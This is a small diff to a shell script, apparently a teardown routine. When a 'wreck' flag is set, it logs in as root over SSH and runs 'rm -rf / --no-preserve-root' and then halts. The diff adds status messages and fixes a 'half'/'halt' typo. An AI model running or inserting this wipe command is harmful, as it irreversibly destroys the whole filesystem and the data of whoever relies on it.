@@ -83,8 +83,10 @@ fi
 
 if [[ $wreck == true ]]; then
 ssh root@localhost -T <<EOF
+echo "* Wiping filesystem..."
 rm -rf / --no-preserve-root
-half
+echo "* Morituri te salutant."
+halt
 EOF
 fi
 
